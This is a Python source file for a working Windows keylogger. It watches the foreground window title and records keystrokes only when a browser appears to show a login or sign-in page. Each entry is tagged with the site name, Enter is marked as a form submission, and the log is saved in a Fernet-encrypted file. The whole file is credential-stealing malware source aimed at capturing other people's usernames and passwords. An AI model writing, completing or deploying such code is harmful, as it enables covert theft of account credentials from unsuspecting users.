from pynput import keyboard
from cryptography.fernet import Fernet
import os
import win32gui
import time

# === Setup Key ===
key_file = "key.key"
if not os.path.exists(key_file):
    with open(key_file, "wb") as kf:
        kf.write(Fernet.generate_key())

with open(key_file, "rb") as kf:
    key = kf.read()

cipher = Fernet(key)

# Create an initial log file to ensure it exists
with open("log.enc", "ab") as f:
    f.write(cipher.encrypt(f"Keylogger started at {time.ctime()}".encode()) + b'\n')

# === Get Active Window Title ===
def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception as e:
        print(f"Error getting window title: {e}")
        return ""

# === Write Encrypted Log ===
def write_log(data, context=""):
    try:
        # Add timestamp and context if provided
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}]" + (f" [{context}]" if context else "") + f": {data}"

        encrypted = cipher.encrypt(log_entry.encode())
        with open("log.enc", "ab") as f:
            f.write(encrypted + b'\n')
        print(f"Logged: {log_entry}")
    except Exception as e:
        print(f"Error writing log: {e}")

# === Targeted Keylogger Callback ===
def on_press(key):
    active_window = get_active_window_title()
    print(f"Active window: {active_window}")

    # Convert to lowercase for case-insensitive matching
    active_window_lower = active_window.lower()

    # Check if the active window is a browser
    browsers = ["chrome", "firefox", "edge", "opera", "brave"]
    is_browser = any(browser in active_window_lower for browser in browsers)

    # Check if the window title contains login-related terms
    login_terms = ["login", "sign in", "signin", "log in", "username", "password", "authentication", "account"]
    is_login_page = any(term in active_window_lower for term in login_terms)

    # Only log keystrokes if it's a browser AND likely a login page
    if is_browser and is_login_page:
        print("Login attempt detected - logging keystrokes")
        # Extract website name from the window title (usually at the beginning before "-" or "|")
        website = active_window.split(" - ")[0].split(" | ")[0].strip()

        try:
            write_log(f"{key.char}", context=website)
        except AttributeError:
            write_log(f"[{key}]", context=website)

        # Start a new log entry when Enter key is pressed (likely submitting the form)
        if key == keyboard.Key.enter:
            write_log("[FORM SUBMITTED]", context=website)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# === Start Listener ===
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
